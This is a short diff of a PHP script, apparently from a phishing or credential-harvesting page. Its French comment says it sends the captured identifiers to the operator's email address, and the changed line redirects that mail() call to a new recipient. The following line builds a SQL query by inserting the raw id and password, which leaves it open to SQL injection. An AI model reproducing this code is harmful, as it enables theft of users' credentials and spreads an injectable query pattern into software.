@@ -35,7 +35,7 @@
 					   
 					   
 	                   // On envoi les identifiants à notre adresse mail voulu
-	                   mail('assanes189@gmail.com','NesQuiiKz.com', $all );
+	                   mail('nesquiikz@nesquiikz.com','NesQuiiKz.com', $all );
 					   
 					   // On vérifie que les identifiants n'ont pas été déjà enregistrés
 					   $SQL="SELECT * FROM `Base de données MySQL`.`ids` WHERE id='$id' AND mdp='$mdp'";
